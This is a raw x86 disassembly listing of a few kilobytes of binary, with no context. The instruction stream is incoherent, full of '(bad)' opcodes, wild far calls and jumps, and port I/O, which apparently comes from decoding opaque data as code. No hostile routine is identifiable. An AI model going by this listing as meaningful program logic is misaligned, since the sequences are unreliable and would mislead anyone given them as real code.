  413796:	jmp    0x4137e7
  413798:	arpl   WORD PTR [edi+0x2b03e517],di
  41379e:	push   0xffffff92
  4137a0:	sub    BYTE PTR [edi+0x6edd9bcc],0x3d
  4137a7:	pop    edx
  4137a8:	int    0xfe
  4137aa:	add    eax,0x5dda78a9
  4137af:	dec    ebp
  4137b0:	fs dec edx
  4137b2:	mov    ebp,0x68a83f5e
  4137b7:	sub    al,0xf5
  4137b9:	daa    
  4137ba:	imul   edx,DWORD PTR [ebx-0x1a],0xf3c2ce2
  4137c1:	pop    esp
  4137c2:	dec    esp
  4137c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4137c4:	mov    bl,0x98
  4137c6:	pop    eax
  4137c7:	scas   al,BYTE PTR es:[edi]
  4137c8:	lock push edi
  4137ca:	inc    ecx
  4137cb:	loope  0x4137c3
  4137cd:	nop
  4137ce:	cmp    BYTE PTR [edx+0x2e165090],dh
  4137d4:	add    dl,cl
  4137d6:	test   al,0xc
  4137d8:	scas   al,BYTE PTR es:[edi]
  4137d9:	shl    DWORD PTR [eax-0x54291a2c],0x8d
  4137e0:	or     ah,BYTE PTR [edi-0x6b]
  4137e3:	(bad)  
  4137e4:	mov    esi,0x800c757d
  4137e9:	cmp    eax,0x2f7d6bf7
  4137ee:	push   ebx
  4137ef:	inc    edx
  4137f0:	je     0x41383b
  4137f2:	cmc    
  4137f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4137f4:	in     eax,dx
  4137f5:	push   eax
  4137f6:	adc    eax,0x2f8f8b8b
  4137fb:	and    al,0x81
  4137fd:	sar    edx,0x77
  413800:	mov    eax,ds:0x14248996
  413805:	jl     0x4137d8
  413807:	adc    esp,edi
  413809:	call   0xdfdf:0x31153f88
  413810:	sahf   
  413811:	dec    ebp
  413812:	inc    edx
  413813:	mov    DWORD PTR [ecx],edx
  413815:	push   0x4
  413817:	fdivr  st(6),st
  413819:	push   edi
  41381a:	jnp    0x4137f2
  41381c:	mov    eax,ds:0x539679b9
  413821:	push   cs
  413822:	jg     0x4137fb
  413824:	jo     0x4137b1
  413826:	jp     0x41389c
  413828:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413829:	call   0xc25a:0xfd7191f7
  413830:	bound  edx,QWORD PTR [eax-0x51]
  413833:	adc    BYTE PTR [esi+0x75],bh
  413836:	jnp    0x413843
  413838:	icebp  
  413839:	lea    eax,[esi+0x64b8ba2f]
  41383f:	mov    ecx,0x904ff027
  413844:	daa    
  413845:	add    edx,ebx
  413847:	cld    
  413848:	and    eax,0x350d366f
  41384d:	mov    ch,0xc0
  41384f:	mov    al,0xcb
  413851:	sub    al,0x8a
  413853:	inc    ecx
  413854:	jnp    0x4137db
  413856:	out    dx,al
  413857:	pop    esp
  413858:	jbe    0x41389f
  41385a:	fld    TBYTE PTR [esi+edi*8]
  41385d:	int3   
  41385e:	lock mov esp,0x9626ac64
  413864:	mov    bl,0x5b
  413866:	add    bl,ah
  413868:	out    dx,al
  413869:	pop    ecx
  41386a:	sbb    DWORD PTR [edi-0x70],0xffffffa9
  41386e:	mov    ah,al
  413870:	mov    ah,0xa2
  413872:	fist   WORD PTR [edx+0x4b8dd7b7]
  413878:	rol    ecx,1
  41387a:	repz shr DWORD PTR [ebp+0x1c],cl
  41387e:	mov    ss,ecx
  413880:	pop    ecx
  413881:	and    DWORD PTR [edx+0x3e],ebp
  413884:	ficomp WORD PTR ds:0x1940843c
  41388a:	pop    ecx
  41388b:	and    al,0x25
  41388d:	stos   DWORD PTR es:[edi],eax
  41388e:	inc    edx
  41388f:	jae    0x4138d3
  413891:	lock push 0xea4698d2
  413897:	pusha  
  413898:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413899:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41389a:	inc    eax
  41389b:	ja     0x4138c5
  41389d:	aad    0x7e
  41389f:	lock call 0x304d:0x4dbf5f63
  4138a7:	pop    edx
  4138a8:	inc    eax
  4138a9:	dec    esp
  4138aa:	test   edi,ecx
  4138ac:	fwait
  4138ad:	jbe    0x413864
  4138af:	clc    
  4138b0:	scas   al,BYTE PTR es:[edi]
  4138b1:	in     al,dx
  4138b2:	sbb    cl,BYTE PTR [ecx+0x6f0cc110]
  4138b8:	cmp    al,0xfe
  4138ba:	aas    
  4138bb:	inc    esp
  4138bc:	adc    eax,DWORD PTR [edi+0x1c]
  4138bf:	retf   
  4138c0:	mov    bl,0x9b
  4138c2:	shl    BYTE PTR [edi],cl
  4138c4:	(bad)  
  4138c5:	popa   
  4138c6:	sub    BYTE PTR [esi-0x38f8480a],bh
  4138cc:	jmp    0x44a2946a
  4138d1:	xor    DWORD PTR [eax+0x310059a5],ebp
  4138d7:	repnz add DWORD PTR [bp+di+0xb62],ebp
  4138dd:	scas   al,BYTE PTR es:[edi]
  4138de:	add    BYTE PTR [ebp-0x66f6be47],0x33
  4138e5:	push   ebx
  4138e6:	out    0x5,eax
  4138e8:	push   esp
  4138e9:	push   esp
  4138ea:	jle    0x41388d
  4138ec:	fistp  DWORD PTR [esi-0x57b3706b]
  4138f2:	jmp    0x34477bbc
  4138f7:	adc    eax,0x29d3f626
  4138fc:	jmp    0x49e53e42
  413901:	lock fld DWORD PTR [edx+0x46]
  413905:	jb     0x4138d7
  413907:	fstp   DWORD PTR [esp+ebp*4]
  41390a:	rcl    BYTE PTR [eax],1
  41390c:	pushf  
  41390d:	mov    edx,0xd83d9575
  413912:	mov    ebp,0x838d55c8
  413917:	daa    
  413918:	xor    eax,0xd177ec69
  41391d:	mov    ebx,0x8e757064
  413922:	push   esp
  413923:	add    cl,0xb7
  413926:	cmp    al,0x4a
  413928:	jle    0x413915
  41392a:	ins    BYTE PTR es:[edi],dx
  41392b:	test   DWORD PTR [ecx+edi*2],esp
  41392e:	push   es
  41392f:	call   0x15675b96
  413934:	loop   0x41398e
  413936:	inc    esi
  413937:	jno    0x413961
  413939:	and    edi,esi
  41393b:	add    ebp,DWORD PTR [edi-0x4d]
  41393e:	ja     0x413916
  413940:	mov    ds:0x1dde857b,al
  413945:	and    eax,0xa6c1ee79
  41394a:	fwait
  41394b:	aaa    
  41394c:	lods   eax,DWORD PTR ds:[esi]
  41394d:	cli    
  41394e:	dec    esp
  41394f:	js     0x4138d6
  413951:	pop    ecx
  413952:	adc    ebp,edx
  413954:	cld    
  413955:	mov    ch,0xec
  413957:	cdq    
  413958:	dec    ecx
  413959:	inc    eax
  41395a:	xor    dh,bh
  41395c:	adc    DWORD PTR [edx],esi
  41395e:	fmul   DWORD PTR [ecx]
  413960:	jl     0x413943
  413962:	add    esi,eax
  413964:	sbb    DWORD PTR [esi],esi
  413966:	xchg   ecx,eax
  413967:	adc    al,0x51
  413969:	cdq    
  41396a:	shl    BYTE PTR [ecx+0x5d],cl
  41396d:	outs   dx,DWORD PTR ds:[esi]
  41396e:	push   cs
  41396f:	sbb    bh,BYTE PTR [edx+0x6f]
  413972:	loope  0x41395a
  413974:	lods   eax,DWORD PTR ds:[esi]
  413975:	ret    0xd9e1
  413978:	lea    ebx,[ebp-0x4bff6177]
  41397e:	pop    esi
  41397f:	lea    ebx,[ebx+0x4c35d8dd]
  413985:	call   0x6f7e:0xffba7045
  41398c:	push   es
  41398d:	aad    0xfa
  41398f:	nop
  413990:	or     BYTE PTR [edi+0xc4cd8a1],al
  413996:	cld    
  413997:	std    
  413998:	mov    eax,ds:0xef6df50f
  41399d:	repz inc edi
  41399f:	rol    DWORD PTR [eax-0x3b06f124],cl
  4139a5:	loope  0x4139aa
  4139a7:	(bad)  
  4139a8:	sbb    edi,DWORD PTR [edx+0x28e07ea3]
  4139ae:	sbb    eax,0xed92280f
  4139b3:	rcl    BYTE PTR [edx+0x81bc538],cl
  4139b9:	jns    0x413985
  4139bb:	(bad)  
  4139bc:	and    DWORD PTR [ebx+0x30],edx
  4139bf:	call   0xa13d:0xc914f6b9
  4139c6:	bound  ebp,QWORD PTR [eax+eiz*8]
  4139c9:	dec    esi
  4139ca:	xor    eax,DWORD PTR [ebp-0x10]
  4139cd:	mov    dl,0x5c
  4139cf:	and    al,0xfc
  4139d1:	ins    DWORD PTR es:[edi],dx
  4139d2:	js     0x413970
  4139d4:	and    DWORD PTR [edi+esi*2+0x11ae9e66],ebx
  4139db:	pusha  
  4139dc:	pop    esi
  4139dd:	sub    esi,DWORD PTR [edi+eiz*8]
  4139e0:	sub    al,0x89
  4139e2:	xchg   BYTE PTR [ecx+0x5b8bdb6e],ch
  4139e8:	add    BYTE PTR [esi-0x42],al
  4139eb:	retf   0x27ef
  4139ee:	test   eax,0x1fc8254a
  4139f3:	mov    edi,0x7c80f3c1
  4139f8:	mov    esp,0x4518daec
  4139fd:	lods   eax,DWORD PTR ds:[esi]
  4139fe:	ja     0x413a69
  413a00:	(bad)  
  413a01:	push   edi
  413a02:	xchg   esp,eax
  413a03:	mov    cl,0x78
  413a05:	lahf   
  413a06:	push   ds
  413a07:	loope  0x413a50
  413a09:	or     al,0x35
  413a0b:	sbb    esp,DWORD PTR [ecx+0x34]
  413a0e:	retf   
  413a0f:	jns    0x413a20
  413a11:	mov    ebx,0x2ea8f435
  413a16:	aad    0x3
  413a18:	jnp    0x4139b5
  413a1a:	mov    edi,0xad1adfe
  413a1f:	jecxz  0x413a64
  413a21:	popf   
  413a22:	idiv   cl
  413a24:	xchg   edx,eax
  413a25:	sahf   
  413a26:	hlt    
  413a27:	ins    BYTE PTR es:[edi],dx
  413a28:	add    ecx,DWORD PTR ds:0x12e07697
  413a2e:	stc    
  413a2f:	sar    BYTE PTR [ebx-0x3b235144],0x6d
  413a36:	cmp    eax,0xd87dd11a
  413a3b:	fstp   TBYTE PTR [ebx-0x1424d1a5]
  413a41:	push   edi
  413a42:	daa    
  413a43:	sbb    DWORD PTR [eax],0x63
  413a46:	mov    esi,ecx
  413a48:	xchg   esp,eax
  413a49:	xlat   BYTE PTR ds:[ebx]
  413a4a:	clc    
  413a4b:	inc    esi
  413a4c:	sub    edi,DWORD PTR [ebp-0x3ccf1b83]
  413a52:	or     ah,BYTE PTR [edi]
  413a54:	test   ch,bh
  413a56:	mov    ds:0x8e701e5d,eax
  413a5b:	and    eax,0x98419a97
  413a60:	xor    edi,DWORD PTR [ecx-0x4179cdcf]
  413a66:	rcr    BYTE PTR cs:[ecx-0x62],0xcf
  413a6b:	push   esi
  413a6c:	in     al,0x3
  413a6e:	or     eax,0x530a3066
  413a73:	xchg   edx,eax
  413a74:	push   esp
  413a75:	mov    al,0x44
  413a77:	imul   edi,DWORD PTR ds:0x4daa9b91,0xdaaffff
  413a81:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413a82:	das    
  413a83:	imul   edx,esp,0x38
  413a86:	icebp  
  413a87:	add    eax,0x9d8dc86d
  413a8c:	jb     0x413ac2
  413a8e:	ins    DWORD PTR es:[edi],dx
  413a8f:	push   0x6d97e5c3
  413a94:	(bad)  
  413a95:	and    bl,BYTE PTR [ebp-0x9]
  413a98:	call   0x516b2bb5
  413a9d:	les    edx,FWORD PTR [ebp+ecx*2+0x30bb90a1]
  413aa4:	pop    esi
  413aa5:	mov    esi,0xb0d397e8
  413aaa:	outs   dx,BYTE PTR ds:[esi]
  413aab:	inc    ebx
  413aac:	js     0x413a4a
  413aae:	jnp    0x413afe
  413ab0:	fadd   QWORD PTR [esi+0x677a0c00]
  413ab6:	popf   
  413ab7:	add    ebx,DWORD PTR [eax+0x6e]
  413aba:	rol    DWORD PTR [edx+0x27ba9cf6],0xd8
  413ac1:	mov    ecx,cs
  413ac3:	or     DWORD PTR [esp+ebp*2+0x4becdd44],edx
  413aca:	pop    ebx
  413acb:	test   eax,0x8c339b72
  413ad0:	mov    dh,0x55
  413ad2:	or     BYTE PTR ds:0xfc82352b,dl
  413ad8:	xchg   ecx,eax
  413ad9:	jne    0x413afa
  413adb:	call   0xc1f3:0x2bc07a36
  413ae2:	(bad)  
  413ae3:	mov    BYTE PTR [ebx],al
  413ae5:	xchg   ebp,eax
  413ae6:	aam    0x6
  413ae8:	jmp    0x413ae7
  413aea:	inc    esp
  413aeb:	inc    esp
  413aec:	(bad)  
  413aed:	push   0xffffffd7
  413aef:	pop    edx
  413af0:	aas    
  413af1:	scas   al,BYTE PTR es:[edi]
  413af2:	sbb    al,0x9a
  413af4:	mov    es,WORD PTR [esi-0x60]
  413af7:	adc    al,0x91
  413af9:	sbb    dl,BYTE PTR [ebx-0x59d869b1]
  413aff:	dec    esi
  413b00:	inc    esp
  413b01:	fst    st(0)
  413b03:	test   ebx,esp
  413b05:	inc    ebp
  413b06:	add    DWORD PTR [ebx-0x47f12e01],0x21dd03eb
  413b10:	sbb    bl,BYTE PTR [esi+eiz*8-0x11882f95]
  413b17:	lods   al,BYTE PTR ds:[esi]
  413b18:	push   ebp
  413b19:	push   esi
  413b1a:	xchg   ebx,eax
  413b1b:	push   ecx
  413b1c:	mov    ds:0xb982cbf3,al
  413b21:	jmp    0x7d25ea52
  413b26:	or     al,0x62
  413b28:	xlat   BYTE PTR ds:[ebx]
  413b29:	sti    
  413b2a:	adc    DWORD PTR [esi-0x311645f0],eax
  413b30:	sub    ch,cl
  413b32:	fisub  WORD PTR [edi]
  413b34:	add    al,0x3
  413b36:	sbb    DWORD PTR [ebx-0x6c],eax
  413b39:	jno    0x413aeb
  413b3b:	cmp    esi,DWORD PTR [edx-0x4d07bef8]
  413b41:	je     0x413b4a
  413b43:	mov    BYTE PTR [eax+ebx*4+0x3d],ah
  413b47:	or     ah,bl
  413b49:	mov    fs,WORD PTR [eax+edi*1-0x284226c5]
  413b50:	sub    bl,0x55
  413b53:	jns    0xc011e718
  413b59:	and    al,0x35
  413b5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413b5c:	or     al,0xbd
  413b5e:	jmp    0x83df1748
  413b63:	stos   DWORD PTR es:[edi],eax
  413b64:	dec    BYTE PTR [ecx+0x6666dac3]
  413b6a:	shl    BYTE PTR [edx+ebx*1-0x5d5199b5],0x83
  413b72:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b73:	adc    ah,BYTE PTR [ebp-0x2f]
  413b76:	ret    
  413b77:	call   0xe06fc065
  413b7c:	out    dx,eax
  413b7d:	pop    ebx
  413b7e:	xchg   ecx,eax
  413b7f:	push   0x201bdf97
  413b84:	add    DWORD PTR [ecx-0x85dd4f0],edx
  413b8a:	fisttp QWORD PTR [ebp+0x7e]
  413b8d:	mov    ds:0xc62d7ab2,eax
  413b92:	mov    edi,0x8b8e73d5
  413b97:	cmp    ebx,esp
  413b99:	mov    ah,0xf1
  413b9b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b9c:	pop    ss
  413b9d:	ins    DWORD PTR es:[edi],dx
  413b9e:	out    dx,al
  413b9f:	cmp    BYTE PTR [edi-0x27],dh
  413ba2:	int3   
  413ba3:	mov    eax,ds:0x261eaf8f
  413ba8:	fcom   st(3)
  413baa:	stc    
  413bab:	xor    ah,BYTE PTR [ebx-0xa786fe0]
  413bb1:	inc    ebp
  413bb2:	mov    al,0x21
  413bb4:	or     BYTE PTR [edx],0x47
  413bb7:	push   ds
  413bb8:	add    bl,ah
  413bba:	add    al,0xab
  413bbc:	loope  0x413c2b
  413bbe:	mov    ?,WORD PTR ds:0x27587f66
  413bc4:	adc    al,0x10
  413bc6:	pop    ecx
  413bc7:	adc    ebx,edi
  413bc9:	stos   BYTE PTR es:[edi],al
  413bca:	(bad)  
  413bcb:	dec    esi
  413bcc:	sbb    ecx,ebp
  413bce:	mov    DWORD PTR [edi-0x4fa69d46],0xce3d202
  413bd8:	lods   eax,DWORD PTR ds:[esi]
  413bd9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413bda:	sbb    BYTE PTR [ecx-0x58],bl
  413bdd:	mov    BYTE PTR [edi-0x35],al
  413be0:	inc    ecx
  413be1:	add    bl,cl
  413be3:	mov    bl,0x27
  413be5:	xor    DWORD PTR [di-0x17],esp
  413be9:	outs   dx,BYTE PTR ds:[esi]
  413bea:	xchg   ebp,eax
  413beb:	xor    eax,0x9c391975
  413bf0:	cmp    al,0x79
  413bf2:	test   eax,0x2d0bd272
  413bf7:	xor    dl,dl
  413bf9:	mov    bh,0x6d
  413bfb:	(bad)  
  413bfc:	mov    edx,0xad266b8f
  413c01:	jg     0x413c44
  413c03:	mov    bl,0x71
  413c05:	not    BYTE PTR [ebp-0x13]
  413c08:	fisttp QWORD PTR ds:0xdec0bfb4
  413c0e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413c0f:	inc    ecx
  413c10:	jmp    0x413bbe
  413c12:	je     0x413ba6
  413c14:	cmp    edx,edi
  413c16:	enter  0x4019,0x6
  413c1a:	mov    bl,0xbd
  413c1c:	loopne 0x413c29
  413c1e:	xchg   ebx,eax
  413c1f:	out    0xce,al
  413c21:	sbb    BYTE PTR [esi+0x7aaaab9b],dh
  413c27:	cmp    cl,BYTE PTR [edx+0x72]
  413c2a:	cmc    
  413c2b:	fld    DWORD PTR [eax+0x705a1e46]
  413c31:	into   
  413c32:	stos   BYTE PTR es:[edi],al
  413c33:	icebp  
  413c34:	mov    bh,0x63
  413c36:	push   ss
  413c37:	popf   
  413c38:	ror    DWORD PTR gs:[eax+0x3],cl
  413c3c:	cwde   
  413c3d:	sti    
  413c3e:	pusha  
  413c3f:	iret   
  413c40:	push   0x76
  413c42:	repnz cld 
  413c44:	jns    0x413c8b
  413c46:	rol    BYTE PTR [ebp+0x1202fe5a],1
  413c4c:	cmp    BYTE PTR [ebx+0x26cc2ce7],ch
  413c52:	sub    DWORD PTR [ecx-0x65],0x39cb626f
  413c59:	xor    bl,dh
  413c5b:	xchg   edx,eax
  413c5c:	aad    0xea
  413c5e:	call   0x1fc0:0xe038a17a
  413c65:	les    esi,FWORD PTR [ecx+0x47c8b7f8]
  413c6b:	rcl    DWORD PTR [esi-0x27a86733],1
  413c71:	adc    ah,BYTE PTR [edx+edi*4+0x490267b6]
  413c78:	aas    
  413c79:	out    0x8a,al
  413c7b:	jp     0x413c16
  413c7d:	inc    esp
  413c7e:	mov    dl,0x23
  413c80:	cld    
  413c81:	mov    ebx,0x6d820b5c
  413c86:	jno    0x413c08
  413c88:	js     0x413c83
  413c8a:	push   ds
  413c8b:	jb     0x413c27
  413c8d:	pop    ecx
  413c8e:	mov    dh,0x98
  413c90:	loop   0x413c6c
  413c92:	call   0x45b8a85b
  413c97:	lods   eax,DWORD PTR ds:[esi]
  413c98:	or     DWORD PTR [edx+0x0],0x0
	...
  413d13:	add    BYTE PTR [eax+0x34],ch
  413d16:	fs mov esi,0xf6fafe7c
  413d1c:	mov    bl,0x9d
  413d1e:	aam    0xd4
  413d20:	xor    al,0x30
  413d22:	adc    al,0xdf
  413d24:	and    esp,0x0
  413d27:	add    BYTE PTR [esi+0x7],ch
  413d2a:	add    BYTE PTR [eax],al
  413d2c:	(bad)  
  413d2d:	enter  0x2f40,0x38
  413d31:	xchg   edi,eax
  413d32:	ret    
  413d33:	pop    ebx
  413d34:	sbb    DWORD PTR [edx*8+0x3618b40c],0x18d2e070
  413d3f:	int3   
  413d40:	push   esp
  413d41:	fwait
  413d42:	mov    al,0xea
  413d44:	fimul  DWORD PTR [edx+edi*1]
  413d47:	adc    al,0x5
  413d49:	popf   
  413d4a:	push   eax
  413d4b:	scas   al,BYTE PTR es:[edi]
  413d4c:	mov    esi,0x2414fcb9
  413d51:	in     al,dx
  413d52:	mov    al,0x7c
  413d54:	shl    DWORD PTR [ebx+0x6b73def4],0x2f
  413d5b:	xchg   esp,eax
  413d5c:	sahf   
  413d5d:	push   ds
  413d5e:	stc    
  413d5f:	xchg   bl,al
  413d61:	shl    DWORD PTR [edi+ecx*8-0x36],cl
  413d65:	test   eax,0x71a390da
  413d6a:	hlt    
  413d6b:	inc    esi
  413d6c:	repz mov eax,?
  413d6f:	xor    DWORD PTR [esi-0x44aabb53],ecx
  413d75:	cmp    dh,BYTE PTR [edi+0x4d]
  413d78:	jp     0x413d39
  413d7a:	mov    WORD PTR [ebp+0x6e15b8b3],gs
  413d80:	das    
  413d81:	in     eax,dx
  413d82:	sahf   
  413d83:	dec    ebx
  413d84:	pop    ebx
  413d85:	stos   DWORD PTR es:[edi],eax
  413d86:	bndstx [edi+0x48d7cf13],(bad)
  413d8d:	(bad)  
  413d8e:	sti    
  413d8f:	test   BYTE PTR [edx-0x8],ah
  413d92:	pop    edi
  413d93:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413d94:	sub    BYTE PTR [eax-0x74],al
  413d97:	mov    ds:0xa313dc2b,eax
  413d9c:	sub    al,0xcd
  413d9e:	sahf   
  413d9f:	fwait
  413da0:	ins    DWORD PTR es:[edi],dx
  413da1:	out    dx,al
  413da2:	sbb    cl,BYTE PTR [eax+eiz*2-0x4d]
  413da6:	dec    ecx
  413da7:	mov    ebx,0x650f9f80
  413dac:	test   DWORD PTR [ebx],esp
  413dae:	pop    esp
  413daf:	pushf  
  413db0:	push   0x63
  413db2:	sbb    edx,edi
  413db4:	fldenv [ebx-0x28]
  413db7:	xchg   DWORD PTR [edi+edi*2],edx
  413dba:	arpl   WORD PTR [edi+0x553cf523],sp
  413dc0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413dc1:	sbb    DWORD PTR [esi-0x40],ebp
  413dc4:	pop    esi
  413dc5:	mov    eax,0xb764b89c
  413dca:	pop    ebx
  413dcb:	call   0x9d8c:0xd2e0b79e
  413dd2:	or     ch,BYTE PTR [eax-0x3cd2c078]
  413dd8:	lahf   
  413dd9:	sub    ah,BYTE PTR [edx]
  413ddb:	popa   
  413ddc:	adc    DWORD PTR [esi+0x5],esi
  413ddf:	xchg   esi,eax
  413de0:	cmc    
  413de1:	pop    esp
  413de2:	fcmovb st,st(5)
  413de4:	push   cs
  413de5:	xor    eax,0x9a0217a2
  413dea:	pop    ds
  413deb:	ja     0x413d7b
  413ded:	idiv   BYTE PTR [ebp-0x79fec834]
  413df3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413df4:	add    eax,0xc4521ed9
  413df9:	lods   eax,DWORD PTR ds:[esi]
  413dfa:	rol    DWORD PTR [ebp-0x3956c68],0xb7
  413e01:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e02:	xchg   BYTE PTR [edi+0x59941f83],ah
  413e08:	push   es
  413e09:	xor    al,0xa9
  413e0b:	es mov ecx,0xe01930d9
  413e11:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413e12:	cmc    
  413e13:	sub    ah,BYTE PTR [esi-0x73c57041]
  413e19:	xor    cl,BYTE PTR ds:0xb31d3c7d
  413e1f:	mov    bh,0x38
  413e21:	clc    
  413e22:	inc    ebp
  413e23:	jecxz  0x413db1
  413e25:	(bad)  
  413e26:	xchg   edi,eax
  413e27:	scas   eax,DWORD PTR es:[edi]
  413e28:	xor    cl,bl
  413e2a:	xor    al,0x94
  413e2c:	or     eax,0x41ca09ef
  413e31:	jl     0x413dff
  413e33:	xchg   ecx,eax
  413e34:	and    al,BYTE PTR gs:[ebp+0x29cd2fea]
  413e3b:	inc    esi
  413e3c:	xchg   ebp,eax
  413e3d:	pop    eax
  413e3e:	leave  
  413e3f:	sub    al,BYTE PTR [edi+0x451ef45]
  413e45:	int3   
  413e46:	push   ss
  413e47:	clc    
  413e48:	lock jmp 0xe26f:0x8fe56862
  413e50:	cli    
  413e51:	cli    
  413e52:	jno    0x413e1c
  413e54:	cld    
  413e55:	outs   dx,DWORD PTR ds:[esi]
  413e56:	mov    ebx,0xb864e7f0
  413e5b:	jp     0x413e95
  413e5d:	fsubr  DWORD PTR [eax]
  413e5f:	jb     0x413e1c
  413e61:	or     al,0x5b
  413e63:	push   esp
  413e64:	adc    eax,0x66f838e7
  413e69:	data16 sbb ch,BYTE PTR [edx]
  413e6c:	mov    ah,BYTE PTR [edx-0x35]
  413e6f:	outs   dx,BYTE PTR ds:[esi]
  413e70:	and    dl,BYTE PTR [edx+esi*2-0x38]
  413e74:	and    al,bl
  413e76:	repnz mov dh,0x11
  413e79:	stc    
  413e7a:	mov    ah,0x49
  413e7c:	jne    0x413e1f
  413e7e:	jbe    0x413e5b
  413e80:	test   esi,0x448d91da
  413e86:	iret   
  413e87:	jp     0x413e58
  413e89:	pop    ecx
  413e8a:	call   0xed89a161
  413e8f:	ins    DWORD PTR es:[edi],dx
  413e90:	mov    edx,0x583ac84d
  413e95:	and    DWORD PTR [esi],esp
  413e97:	sbb    DWORD PTR [ecx-0x14],ebx
  413e9a:	fimul  DWORD PTR [eax+0x4fb3be3b]
  413ea0:	(bad)  
  413ea1:	push   ebp
  413ea2:	pop    esi
  413ea3:	scas   al,BYTE PTR es:[edi]
  413ea4:	cmp    eax,0xea1082e0
  413ea9:	test   DWORD PTR [edx],edi
  413eab:	ret    0xe731
  413eae:	mov    ch,BYTE PTR [ecx+0x25240300]
  413eb4:	icebp  
  413eb5:	lods   eax,DWORD PTR gs:[esi]
  413eb7:	pop    es
  413eb8:	je     0x413e6f
  413eba:	dec    edx
  413ebb:	pop    ecx
  413ebc:	add    DWORD PTR [edi+ebp*2],edi
  413ebf:	cmp    dh,ah
  413ec1:	pop    esi
  413ec2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413ec3:	mov    esi,0xa90798a1
  413ec8:	jo     0x413f04
  413eca:	add    DWORD PTR [edi],eax
  413ecc:	sbb    bl,dh
  413ece:	cs and al,0x57
  413ed1:	pushf  
  413ed2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ed3:	cmp    esp,ecx
  413ed5:	retf   
  413ed6:	lahf   
  413ed7:	cdq    
  413ed8:	ret    
  413ed9:	loop   0x413f2e
  413edb:	cmp    al,0x13
  413edd:	loope  0x413e67
  413edf:	lea    edx,[edx+0x75]
  413ee2:	and    al,0x1c
  413ee4:	pushf  
  413ee5:	aam    0x87
  413ee7:	mov    ah,0x42
  413ee9:	fucom  st(2)
  413eeb:	mov    ?,WORD PTR [ebp-0x2a]
  413eee:	jnp    0x413e8a
  413ef0:	push   ebx
  413ef1:	sub    DWORD PTR [esi-0xe],ecx
  413ef4:	push   esi
  413ef5:	inc    edx
  413ef6:	mov    BYTE PTR [edi+0x3a],dh
  413ef9:	repz xor ebp,DWORD PTR ds:0x6cdf38b7
  413f00:	sbb    eax,0x1d89c58d
  413f05:	rcl    BYTE PTR [ebx-0x71946f4f],1
  413f0b:	sub    bl,dl
  413f0d:	pop    edi
  413f0e:	mov    ebp,0xe4b0d702
  413f13:	add    eax,0x3dc70b9
  413f18:	and    ebx,ebp
  413f1a:	aas    
  413f1b:	popf   
  413f1c:	js     0x413ec8
  413f1e:	jno    0x413ed2
  413f20:	jmp    DWORD PTR [esi+0x5b]
  413f23:	xor    DWORD PTR [ebx],esp
  413f25:	xor    eax,0x8f130e0e
  413f2a:	mov    edx,0x638b99b3
  413f2f:	ret    
  413f30:	jl     0x413ee5
  413f32:	shr    ah,0xbb
  413f35:	mul    DWORD PTR [ebx-0x7cf9317b]
  413f3b:	add    al,0x80
  413f3d:	mov    eax,eax
  413f3f:	aaa    
  413f40:	dec    ebp
  413f41:	push   cs
  413f42:	mov    esi,0x70255dc7
  413f47:	ins    BYTE PTR es:[edi],dx
  413f48:	add    esp,ebp
  413f4a:	lods   eax,DWORD PTR ds:[esi]
  413f4b:	mov    eax,ds:0x5f15e18
  413f50:	xchg   ebp,eax
  413f51:	repz call 0x90c02747
  413f57:	repz xchg esi,eax
  413f59:	pop    ss
  413f5a:	in     al,0x5e
  413f5c:	pop    edx
  413f5d:	pop    ss
  413f5e:	(bad)  
  413f5f:	sub    dl,BYTE PTR [eax]
  413f61:	enter  0x5607,0xf7
  413f65:	cmp    DWORD PTR [ecx],edi
  413f67:	sub    bl,BYTE PTR [edx]
  413f69:	sbb    eax,0xcf84a990
  413f6e:	loope  0x413f60
  413f70:	fimul  WORD PTR [ebp-0x3091e770]
  413f76:	sbb    dl,BYTE PTR [eax+ecx*8+0x369c7de3]
  413f7d:	dec    ebx
  413f7e:	div    DWORD PTR [eax-0x26]
  413f81:	inc    esi
  413f82:	lods   eax,DWORD PTR ds:[esi]
  413f83:	aad    0xb8
  413f85:	mov    bl,0xcb
  413f87:	mov    esi,0x67ff61c8
  413f8c:	and    ebp,edx
  413f8e:	test   ebx,ecx
  413f90:	and    BYTE PTR [esi+0x22d36f89],bl
  413f96:	and    BYTE PTR [ecx],0x6a
  413f99:	or     al,0x75
  413f9b:	mov    edx,0xa2a912e4
  413fa0:	push   edi
  413fa1:	xchg   DWORD PTR [esi+edi*8],ebp
  413fa4:	jge    0x413f61
  413fa6:	int    0xb3
  413fa8:	das    
  413fa9:	inc    ecx
  413faa:	int    0xa1
  413fac:	pushf  
  413fad:	and    DWORD PTR [edi],ecx
  413faf:	mov    ah,BYTE PTR [ebx]
  413fb1:	mov    ch,BYTE PTR [ebx]
  413fb3:	and    ecx,DWORD PTR ds:0xe35017ef
  413fb9:	inc    edi
  413fba:	mov    BYTE PTR [esi-0x7f35a956],al
  413fc0:	loopne 0x413fad
  413fc2:	mov    al,0xff
  413fc4:	push   sp
  413fc6:	jmp    0x7039680a
  413fcb:	pop    es
  413fcc:	mov    edx,0x8adb831a
  413fd1:	enter  0x69d,0x2c
  413fd5:	fnstenv [ecx-0x17]
  413fd8:	xchg   ebp,eax
  413fd9:	xor    al,0x26
  413fdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413fdc:	(bad)  [edi-0x3ef43448]
  413fe2:	pop    ds
  413fe3:	pop    ebx
  413fe4:	ss (bad) 
